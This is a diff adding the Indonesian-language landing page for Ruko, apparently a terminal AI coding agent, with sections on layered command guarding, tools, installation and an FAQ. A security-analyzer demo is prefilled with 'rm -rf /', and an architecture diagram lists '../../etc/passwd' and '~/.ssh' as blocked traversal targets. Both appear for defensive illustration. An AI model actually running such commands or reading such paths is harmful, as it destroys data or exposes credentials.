+          <div class="relative">
+            <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none font-mono text-emerald-400 font-bold">
+              $
+            </div>
+            <input 
+              type="text" 
+              id="sec-input" 
+              class="w-full pl-9 pr-4 py-3.5 glass-input rounded-2xl text-white font-mono text-sm focus:outline-none transition" 
+              value="rm -rf /"
+              placeholder="Masukkan perintah shell untuk dianalisis..."
+            />
+          </div>
+
+          <!-- Dynamic Result Box -->
+          <div id="sec-result" class="pt-2"></div>
+
+        </div>
+      </div>
+    </section>
+
+    <!-- ============================================================
+         Visual LCS Diff Section
+         ============================================================ -->
+    <section class="py-20 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto w-full">
+      <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-center">
+        
+        <div class="lg:col-span-5 space-y-4">
+          <span class="text-xs font-mono uppercase tracking-widest text-emerald-400 font-bold glass-pill px-3 py-1">Transparansi Visual</span>
+          <h2 class="text-3xl sm:text-4xl font-extrabold text-white">Inspeksi Perubahan Berkas dengan Visual LCS Diff</h2>
+          <p class="text-muted text-sm leading-relaxed">
+            Tidak ada modifikasi terselubung. Saat mengedit kode dengan <code>edit_file</code> atau <code>write_file</code>, Ruko merender visual diff berwarna hijau (+) dan merah (-) lengkap dengan penomoran baris dan header hunk Git-style.
+          </p>
+          <div class="space-y-3 font-mono text-xs text-muted pt-2">
+            <div class="flex items-center space-x-2">
+              <span class="text-emerald-400 font-bold">+</span>
+              <span>Baris penambahan disorot hijau ramah mata</span>
+            </div>
+            <div class="flex items-center space-x-2">
+              <span class="text-red-400 font-bold">-</span>
+              <span>Baris pengurangan ditandai merah jelas</span>
+            </div>
+            <div class="flex items-center space-x-2">
+              <span class="text-cyan-400 font-bold">@@</span>
+              <span>Header potongan konteks baris akurat</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="lg:col-span-7">
+          <div class="terminal-window spotlight-card">
+            <div class="terminal-header flex items-center justify-between">
+              <div class="flex items-center space-x-2 font-mono text-xs text-white/90">
+                <span class="text-emerald-400">✏️ edit_file(src/core/config.ts)</span>
+              </div>
+              <div class="flex items-center space-x-1 font-mono text-xs">
+                <button class="diff-toggle-btn px-3 py-1 rounded-xl bg-glass-highlight text-emerald-400 text-[11px] glass-pill" data-mode="unified">Unified</button>
+                <button class="diff-toggle-btn px-3 py-1 rounded-xl text-white/60 text-[11px] glass-pill hover:text-white" data-mode="split">Split</button>
+              </div>
+            </div>
+
+            <!-- Unified Diff View -->
+            <div id="diff-unified-view" class="p-4 font-mono text-xs leading-relaxed overflow-x-auto space-y-1">
+              <div class="diff-hunk px-2 py-0.5 rounded text-[11px]">@@ -42,7 +42,8 @@ export interface AgentConfig {</div>
+              <div class="text-muted px-2">   mode: 'beginner' | 'pro';</div>
+              <div class="text-muted px-2">   defaultProfile: string;</div>
+              <div class="diff-del px-2 py-0.5 rounded">-  guardianEnabled: false;</div>
+              <div class="diff-add px-2 py-0.5 rounded">+  guardianEnabled: true;</div>
+              <div class="diff-add px-2 py-0.5 rounded">+  guardianTimeoutMs: 5000;</div>
+              <div class="text-muted px-2">   execTimeoutMs: number;</div>
+              <div class="text-muted px-2"> }</div>
+            </div>
+
+            <!-- Split Diff View -->
+            <div id="diff-split-view" class="hidden p-4 font-mono text-xs leading-relaxed overflow-x-auto">
+              <div class="grid grid-cols-2 gap-4">
+                <div class="space-y-1 border-r border-white/10 pr-2">
+                  <div class="text-red-400 font-bold border-b border-red-500/20 pb-1">Sebelum:</div>
+                  <div class="text-muted">mode: 'beginner';</div>
+                  <div class="diff-del px-2 py-0.5 rounded">guardianEnabled: false;</div>
+                  <div class="text-muted">execTimeoutMs: 120000;</div>
+                </div>
+                <div class="space-y-1 pl-2">
+                  <div class="text-emerald-400 font-bold border-b border-emerald-500/20 pb-1">Sesudah:</div>
+                  <div class="text-muted">mode: 'beginner';</div>
+                  <div class="diff-add px-2 py-0.5 rounded">guardianEnabled: true;</div>
+                  <div class="diff-add px-2 py-0.5 rounded">guardianTimeoutMs: 5000;</div>
+                  <div class="text-muted">execTimeoutMs: 120000;</div>
+                </div>
+              </div>
+            </div>
+
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ============================================================
+         24 Tools Matrix Section
+         ============================================================ -->
+    <section id="tools" class="py-20 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto w-full">
+      <div class="text-center max-w-2xl mx-auto mb-10 space-y-3">
+        <span class="text-xs font-mono uppercase tracking-widest text-emerald-400 font-bold glass-pill px-3 py-1">Koleksi Senjata Bawaan</span>
+        <h2 class="text-3xl sm:text-4xl font-extrabold text-white">24 Integrated Smart Tools</h2>
+        <p class="text-sm text-muted">Semua tool tersedia bawaan tanpa perlu install plugin eksternal pihak ketiga.</p>
+      </div>
+
+      <!-- Category Filter Pills & Search -->
+      <div class="flex flex-col sm:flex-row items-center justify-between gap-4 mb-8">
+        
+        <div class="flex flex-wrap items-center gap-1.5 font-mono text-xs">
+          <button class="tools-cat-btn px-3.5 py-1.5 rounded-xl glass-pill bg-glass-highlight text-white transition font-medium" data-cat="all">Semua (24)</button>
+          <button class="tools-cat-btn px-3.5 py-1.5 rounded-xl glass-pill text-white/70 hover:text-white transition" data-cat="execution">Eksekusi Shell</button>
+          <button class="tools-cat-btn px-3.5 py-1.5 rounded-xl glass-pill text-white/70 hover:text-white transition" data-cat="inspection">Inspeksi & Cari</button>
+          <button class="tools-cat-btn px-3.5 py-1.5 rounded-xl glass-pill text-white/70 hover:text-white transition" data-cat="fileops">Manipulasi Berkas</button>
+          <button class="tools-cat-btn px-3.5 py-1.5 rounded-xl glass-pill text-white/70 hover:text-white transition" data-cat="memory">Memori & Skill</button>
+          <button class="tools-cat-btn px-3.5 py-1.5 rounded-xl glass-pill text-white/70 hover:text-white transition" data-cat="subagent">Subagent</button>
+        </div>
+
+        <div class="w-full sm:w-64">
+          <input 
+            type="text" 
+            id="tools-search-input" 
+            placeholder="Cari tool (contoh: glob, patch)..." 
+            class="w-full px-3.5 py-2 glass-input rounded-xl text-xs font-mono text-white/90 placeholder:text-muted-soft focus:outline-none"
+          />
+        </div>
+
+      </div>
+
+      <!-- Dynamic Tools Cards Grid -->
+      <div id="tools-grid-container" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5"></div>
+
+    </section>
+
+    <!-- ============================================================
+         24+ Slash Commands Section
+         ============================================================ -->
+    <section id="commands" class="py-20 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto w-full">
+      <div class="glass-panel p-8 sm:p-12 rounded-3xl border border-white/15">
+        <div class="flex flex-col md:flex-row md:items-end justify-between mb-8 gap-4">
+          <div class="space-y-2">
+            <span class="text-xs font-mono uppercase tracking-widest text-emerald-400 font-bold glass-pill px-3 py-1">Terminal Control Center</span>
+            <h2 class="text-3xl font-extrabold text-white">24+ Slash Commands Lengkap</h2>
+            <p class="text-muted text-sm">Akses cepat kendali agen, pergantian role, status konteks, hingga snapshot undo.</p>
+          </div>
+          <div class="w-full md:w-72">
+            <input 
+              type="text" 
+              id="cmd-search-input" 
+              placeholder="Cari perintah slash (contoh: /plan, /undo)..." 
+              class="w-full px-3.5 py-2 glass-input rounded-xl text-xs font-mono text-white/90 placeholder:text-muted-soft focus:outline-none"
+            />
+          </div>
+        </div>
+
+        <!-- Commands Container -->
+        <div id="commands-list-container" class="bg-black/30 rounded-2xl border border-white/10 p-3 max-h-[460px] overflow-y-auto"></div>
+      </div>
+    </section>
+
+    <!-- ============================================================
+         Architecture Diagram Section
+         ============================================================ -->
+    <section class="py-20 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto w-full">
+      <div class="text-center max-w-2xl mx-auto mb-12 space-y-3">
+        <span class="text-xs font-mono uppercase tracking-widest text-emerald-400 font-bold glass-pill px-3 py-1">Arsitektur Sistem</span>
+        <p class="text-3xl font-extrabold text-white">Siklus Pertahanan Defense-in-Depth</p>
+      </div>
+
+      <div class="glass-card spotlight-card p-6 max-w-4xl mx-auto rounded-3xl">
+        <pre class="text-xs sm:text-sm font-mono text-white/90 leading-relaxed overflow-x-auto text-center sm:text-left">
+┌────────────────────────────────────────────────────────────────────────┐
+│  <span class="text-emerald-400 font-bold">Input Pengguna / Rekomendasi Tool Agen</span>                                │
+└───────────────────────────────────┬────────────────────────────────────┘
+                                    │
+                                    ▼
+┌────────────────────────────────────────────────────────────────────────┐
+│  <span class="text-cyan-400 font-bold">Workspace Sandbox Boundary: assertInsideWorkspace()</span>                   │
+│  Blokir directory traversal: ../../etc/passwd, ~/.ssh, symlink loops   │
+└───────────────────────────────────┬────────────────────────────────────┘
+                                    │
+                                    ▼
+┌────────────────────────────────────────────────────────────────────────┐
+│  <span class="text-amber-400 font-bold">Layer 1: Deterministic Regex Gate (&lt; 1ms)</span>                            │
+│  ├── [NONE]      ───► Lanjut Eksekusi Instan                          │
+│  ├── [BLOCKED]   ───► Ditolak Mutlak Seketika (Refusal Synthesized)   │
+│  └── [DANGEROUS] ───► Eskalasi ke Layer 2 Guardian                    │
+└───────────────────────────────────┬────────────────────────────────────┘
+                                    │
+                                    ▼
+┌────────────────────────────────────────────────────────────────────────┐
+│  <span class="text-emerald-400 font-bold">Layer 2: Guardian LLM (Analisis Semantik Isolasi, Temp 0)</span>            │
+│  ├── [SAFE]      ───► Auto-Allow &amp; Catat Audit                        │
+│  ├── [BLOCKED]   ───► Ditolak Seketika &amp; Catat Audit                  │
+│  └── [DANGEROUS] ───► Minta Konfirmasi Manual Pengguna [y/N]          │
+└───────────────────────────────────┬────────────────────────────────────┘
+                                    │
+                                    ▼
+┌────────────────────────────────────────────────────────────────────────┐
+│  <span class="text-indigo-400 font-bold">Audit Trail &amp; Snapshot Journal</span>                                        │
+│  ├── Cadangkan snapshot file ke .ruko/undo/ (mode 0600)                │
+│  └── Catat audit keamanan ke .ruko/guardian-audit.log (0600)           │
+└────────────────────────────────────────────────────────────────────────┘</pre>
+      </div>
+    </section>
+
+    <!-- ============================================================
+         Installation & Getting Started Section
+         ============================================================ -->
+    <section id="instalasi" class="py-20 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto w-full">
+      <div class="text-center max-w-2xl mx-auto mb-14 space-y-3">
+        <span class="text-xs font-mono uppercase tracking-widest text-emerald-400 font-bold glass-pill px-3 py-1">Langkah Cepat</span>
+        <p class="text-3xl sm:text-4xl font-extrabold text-white">Mulai Coding dalam 60 Detik</p>
+      </div>
+
+      <div class="grid grid-cols-1 md:grid-cols-4 gap-6">
+        
+        <div class="glass-card spotlight-card p-6 rounded-3xl space-y-3">
+          <div class="w-9 h-9 rounded-2xl glass-button text-emerald-400 flex items-center justify-center font-mono font-bold text-sm">1</div>
+          <h3 class="font-bold text-white text-base">Instalasi Global</h3>
+          <p class="text-xs text-muted leading-relaxed">
+            Jalankan skrip instalasi otomatis via curl atau npm:
+          </p>
+          <div class="bg-black/40 p-2.5 rounded-xl font-mono text-[11px] text-emerald-300 overflow-x-auto border border-white/10">
+            curl -fsSL https://... | bash
+          </div>
+        </div>
+
+        <div class="glass-card spotlight-card p-6 rounded-3xl space-y-3">
+          <div class="w-9 h-9 rounded-2xl glass-button text-emerald-400 flex items-center justify-center font-mono font-bold text-sm">2</div>
+          <h3 class="font-bold text-white text-base">Masuk Proyek</h3>
+          <p class="text-xs text-muted leading-relaxed">
+            Masuk ke direktori repository Anda lalu panggil Ruko:
+          </p>
+          <div class="bg-black/40 p-2.5 rounded-xl font-mono text-[11px] text-emerald-300 border border-white/10">
+            cd /path/ke/proyek<br />
+            ruko
+          </div>
+        </div>
+
+        <div class="glass-card spotlight-card p-6 rounded-3xl space-y-3">
+          <div class="w-9 h-9 rounded-2xl glass-button text-emerald-400 flex items-center justify-center font-mono font-bold text-sm">3</div>
+          <h3 class="font-bold text-white text-base">Workspace Trust</h3>
+          <p class="text-xs text-muted leading-relaxed">
+            Konfirmasi keamanan folder saat pertama kali dibuka:
+          </p>
+          <div class="bg-black/40 p-2.5 rounded-xl font-mono text-[11px] text-white/80 border border-white/10">
+            Percayai folder ini? (y/n): <span class="text-emerald-400">y</span>
+          </div>
+        </div>
+
+        <div class="glass-card spotlight-card p-6 rounded-3xl space-y-3">
+          <div class="w-9 h-9 rounded-2xl glass-button text-emerald-400 flex items-center justify-center font-mono font-bold text-sm">4</div>
+          <h3 class="font-bold text-white text-base">Pair Programming!</h3>
+          <p class="text-xs text-muted leading-relaxed">
+            Pilih model AI favorit Anda (OpenAI, DeepSeek, Ollama) dan mulai coding.
+          </p>
+          <div class="bg-black/40 p-2.5 rounded-xl font-mono text-[11px] text-cyan-300 border border-white/10">
+            /login
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ============================================================
+         FAQ Section
+         ============================================================ -->
+    <section id="faq" class="py-20 px-4 sm:px-6 lg:px-8 max-w-4xl mx-auto w-full">
+      <div class="text-center mb-12 space-y-3">
+        <span class="text-xs font-mono uppercase tracking-widest text-emerald-400 font-bold glass-pill px-3 py-1">Tanya Jawab</span>
+        <p class="text-3xl font-extrabold text-white">Frequently Asked Questions</p>
+      </div>
+
+      <div class="space-y-4">
+        
+        <div class="faq-item glass-card rounded-2xl overflow-hidden">
+          <button class="faq-trigger w-full px-6 py-4 text-left font-medium text-white flex items-center justify-between text-sm sm:text-base">
+            <span>Apakah Ruko bisa digunakan 100% offline tanpa internet?</span>
+            <svg class="faq-icon w-4 h-4 text-muted transition-transform duration-200" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+          </button>
+          <div class="faq-content hidden px-6 pb-4 text-xs sm:text-sm text-muted leading-relaxed border-t border-white/10 pt-3">
+            Ya! Ruko mendukung OpenAI-compatible provider lokal seperti <b>Ollama</b> (<code>http://localhost:11434/v1</code>), <b>LM Studio</b>, maupun <b>vLLM</b>. Anda dapat coding secara privat tanpa mengirimkan kode ke cloud.
+          </div>
+        </div>
+
+        <div class="faq-item glass-card rounded-2xl overflow-hidden">
+          <button class="faq-trigger w-full px-6 py-4 text-left font-medium text-white flex items-center justify-between text-sm sm:text-base">
+            <span>Mengapa Ruko bersikeras dengan Zero Runtime Dependencies?</span>
+            <svg class="faq-icon w-4 h-4 text-muted transition-transform duration-200" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+          </button>
+          <div class="faq-content hidden px-6 pb-4 text-xs sm:text-sm text-muted leading-relaxed border-t border-white/10 pt-3">
+            Sebagian besar serangan supply chain pada ekosistem Node.js terjadi karena library transitive pihak ketiga yang dikompromikan. Dengan mengandalkan pustaka bawaan kernel Node.js (<code>node:fs</code>, <code>node:child_process</code>, <code>node:readline</code>), Ruko sepenuhnya kebal terhadap ancaman pembajakan paket dependensi eksternal dan startup time menjadi mendekati instan (&lt;15ms).
+          </div>
+        </div>
+
+        <div class="faq-item glass-card rounded-2xl overflow-hidden">
+          <button class="faq-trigger w-full px-6 py-4 text-left font-medium text-white flex items-center justify-between text-sm sm:text-base">
+            <span>Bagaimana Guardian LLM melindungi saya tanpa bocor konteks?</span>
+            <svg class="faq-icon w-4 h-4 text-muted transition-transform duration-200" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+          </button>
+          <div class="faq-content hidden px-6 pb-4 text-xs sm:text-sm text-muted leading-relaxed border-t border-white/10 pt-3">
+            Panggilan Guardian LLM diisolasi sepenuhnya: tidak menyertakan seluruh riwayat obrolan Anda, memiliki kuota token kecil (maksimal 150 token), menggunakan temperatur 0 dengan prompt spesialis analis keamanan, dan hasil evaluasi dicatat permanen ke berkas audit lokal bertanda hak akses <code>0600</code>.
+          </div>
+        </div>
+
+        <div class="faq-item glass-card rounded-2xl overflow-hidden">
+          <button class="faq-trigger w-full px-6 py-4 text-left font-medium text-white flex items-center justify-between text-sm sm:text-base">
+            <span>Apakah Ruko berjalan lancar di Android Termux?</span>
+            <svg class="faq-icon w-4 h-4 text-muted transition-transform duration-200" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+          </button>
+          <div class="faq-content hidden px-6 pb-4 text-xs sm:text-sm text-muted leading-relaxed border-t border-white/10 pt-3">
+            Tentu saja! Ruko telah diuji secara ketat pada resolusi terminal mobile hingga batas ekstrim 40 kolom. Status bar otomatis memprioritaskan persentase budget context dan memotong nama model secara proporsional agar tidak merusak scrollback terminal Anda.
+          </div>
+        </div>
+
+        <div class="faq-item glass-card rounded-2xl overflow-hidden">
+          <button class="faq-trigger w-full px-6 py-4 text-left font-medium text-white flex items-center justify-between text-sm sm:text-base">
+            <span>Bagaimana jika AI membuat perubahan kode yang salah?</span>
+            <svg class="faq-icon w-4 h-4 text-muted transition-transform duration-200" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+          </button>
+          <div class="faq-content hidden px-6 pb-4 text-xs sm:text-sm text-muted leading-relaxed border-t border-white/10 pt-3">
+            Tenang! Cukup ketik perintah <code>/undo</code> atau gunakan tool <code>revert_file</code>. Ruko secara otomatis menyimpan snapshot cadangan berkas ke <code>.ruko/undo/</code> sebelum setiap kali operasi penulisan, pengeditan, atau penghapusan berkas dijalankan.
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ============================================================
+         Bottom CTA Callout (Owens Aurora Glow)
+         ============================================================ -->
+    <section class="py-16 px-4 sm:px-6 lg:px-8 max-w-5xl mx-auto w-full">
+      <div class="glass-panel p-8 sm:p-12 text-center space-y-6 rounded-3xl relative overflow-hidden">
+        <div class="relative z-10 max-w-2xl mx-auto space-y-4">
+          <h2 class="text-3xl sm:text-4xl font-extrabold text-white">Siap Merasakan AI Coding Agent Tanpa Beban Dependensi?</h2>
+          <p class="text-muted text-sm leading-relaxed">
+            Bergabunglah dengan pengembang yang memilih kecepatan terminal, privasi data lokal, dan keamanan pertahanan berlapis.
+          </p>
+          <div class="pt-2 flex flex-col sm:flex-row items-center justify-center gap-3">
+            <a 
+              href="https://github.com/Iky969/Ruko-agent" 
+              target="_blank" 
+              rel="noopener noreferrer"
+              class="w-full sm:w-auto px-6 py-3 rounded-2xl glass-button text-white font-mono font-bold text-sm transition"
+            >
+              ⭐ Kunjungi Repositori GitHub
+            </a>
+            <a 
+              href="#instalasi" 
+              class="w-full sm:w-auto px-6 py-3 rounded-2xl glass-pill text-white/90 font-mono text-sm transition"
+            >
+              Panduan Instalasi
+            </a>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============================================================
+         Footer (Owens Style Glass Bar)
+         ============================================================ -->
+    <footer class="mt-auto px-4 sm:px-8 pb-8">
+      <div class="max-w-7xl mx-auto rounded-3xl glass-panel py-6 px-6 sm:px-8 flex flex-col sm:flex-row items-center justify-between gap-4 text-xs font-mono text-muted">
+        
+        <div class="flex items-center space-x-3">
+          <span class="text-emerald-400 font-bold text-base font-mono">&gt;_ RUKO</span>
+          <span>© 2026. Lisensi MIT. Dibuat oleh <a href="https://github.com/Iky969" target="_blank" class="text-white hover:text-emerald-400 transition-colors">@Iky969</a>.</span>
+        </div>
+
+        <div class="flex flex-wrap items-center gap-4 text-muted">
+          <a href="https://github.com/Iky969/Ruko-agent" class="hover:text-emerald-400 transition">GitHub Repo</a>
+          <a href="https://github.com/Iky969/Ruko-agent/blob/main/.github/SECURITY.md" class="hover:text-emerald-400 transition">Kebijakan Keamanan</a>
+          <a href="https://github.com/Iky969/Ruko-agent/blob/main/LICENSE" class="hover:text-emerald-400 transition">Lisensi MIT</a>
+          <a href="https://github.com/Iky969/Ruko-agent/blob/main/CHANGELOG.md" class="hover:text-emerald-400 transition">Changelog</a>
+        </div>
+
+      </div>
+    </footer>
+
+  </div>
+
+  <!-- Scripts -->
+  <script src="js/terminal-simulator.js"></script>
+  <script type="module" src="js/main.js"></script>
+</body>
+</html>
